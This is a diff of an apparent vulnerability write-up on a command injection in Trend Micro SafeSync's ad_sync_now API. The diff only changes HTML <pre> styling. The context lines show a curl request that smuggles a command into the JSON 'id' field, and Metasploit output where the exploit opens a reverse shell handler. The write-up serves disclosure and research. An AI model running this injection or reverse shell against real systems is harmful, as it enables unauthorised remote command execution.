@@ -68,7 +68,7 @@ sub ad_sync_now_PUT {
 
 From a client point of view, this would happen like this:
 
-<pre style="background-color:black; font-size:10pt;width: auto; height: auto; word-wrap: break-word; white-space: pre-wrap; overflow:auto; overflow-y: hidden; color:white;font-family:'monospace';">
+<pre>
 $ curl -X PUT -k -i 'https://safesync.local:3443/api/admin/ad/ad_sync_now' -H 'Accept: */*' -H 'Host: safesync.local:3443' -H 'Content-Type: application/json; charset=utf-8' -H 'Referer: https://safesync.local:3443/admin_ldap_integration.html' -H 'Cookie: mgmtui_session=268b871790680ba79c5de832b18549e6cb908e16' --data '{"id":"1; INJECTED COMMAND"}
 </pre>
 
@@ -78,7 +78,7 @@ Take a look at the Metasploit [module](https://github.com/QKaiser/metasploit-fra
 
 On the plus side, you can always use python if you can't live without tty.
 
-<pre style="background-color:black; font-size:10pt;width: auto; height: auto; word-wrap: break-word; white-space: pre-wrap; overflow:auto; overflow-y: hidden; color:white;font-family:'monospace';">
+<pre>
 msf exploit(trendmicro_safesync_exec) > run
 [*] Started reverse TCP handler on kali.local:4444
 [*] Successfully logged in.
